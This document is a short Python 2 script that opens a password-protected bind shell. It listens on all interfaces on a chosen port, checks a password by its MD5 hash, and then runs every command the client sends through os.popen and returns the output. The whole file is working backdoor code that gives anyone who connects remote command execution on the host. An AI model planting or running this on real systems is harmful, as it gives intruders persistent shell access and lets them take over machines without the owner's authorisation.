#!/usr/bin/env python
#one concurrent user password protected bind shell. 
#could be extended to read a stored password hash from file.
import sys
import os
import socket
import md5

def bindshell(port,password): 
	"""binds a shell to a port protected by a password

	Returns None"""
	md5passcmp = md5.new(password)
	s = socket.socket()
	s.bind(("0.0.0.0",port))
	s.listen(1)
	while 1:
		(cli,add) = s.accept()
		cli.send("Ready: ")
		data = cli.recv(1024)
		data = data.rstrip()
		md5pass = md5.new(data)
		if md5pass.hexdigest() == md5passcmp.hexdigest():
			exitval = 1
		else:
			exitval = 0
		if exitval == 1:
			info = {"platform":sys.platform,"version":sys.version}
			cli.send("".join(("You are connected to shell\r\n", \
			          info["platform"],info["version"],"\r\n")))
		while exitval == 1:
			data = cli.recv(1024)
			if "exit" in data:
				exitval = 0
			resp = os.popen(data).readlines()
			cli.send("".join(resp))
		cli.close()
		
if __name__ == "__main__":
	port = int(sys.argv[1])
	password = sys.argv[2]
	bindshell(port,password)
